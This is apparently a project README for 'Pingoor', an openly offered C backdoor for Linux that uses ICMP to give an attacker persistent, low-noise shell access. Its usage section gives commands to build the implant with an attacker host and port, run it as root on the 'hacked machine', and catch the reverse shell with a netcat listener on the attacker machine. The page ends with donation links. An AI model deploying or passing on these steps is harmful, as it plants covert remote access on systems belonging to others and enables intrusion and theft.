<h1 align="center">「🚪」About Pingoor</h1>

<p align="center"><img src="assets/banner.png"></p>

<p align="center">Pingoor is a backdoor developed in C for the GNU/Linux operating system. Its main characteristic is to use the ICMP protocol to give the attacker access to the shell of a machine, making its access persistent with little noise.</p>

## How to Use

```
# Hacked machine
$ git clone https://github.com/MrEmpy/Pingoor.git
$ cd Pingoor
$ HOST=<YOURHOST> PORT=<YOURPORT> make
$ sudo ./pingoor
```

```
# Attacker machine
nc -lnvp <YOURPORT>
```

## Buy me a coffee?

<a href="https://pixgg.com/MrEmpy" target="_blank">
  <img src="https://pixgg.com/img/logo-darkmode.046d3b61.svg" height="30" widght="30">
</a>
</br>
</br>
<a href="https://www.buymeacoffee.com/mrempy" target="_blank">
  <img src="https://play-lh.googleusercontent.com/aMb_Qiolzkq8OxtQZ3Af2j8Zsp-ZZcNetR9O4xSjxH94gMA5c5gpRVbpg-3f_0L7vlo" height="50" widght="50">
</a>
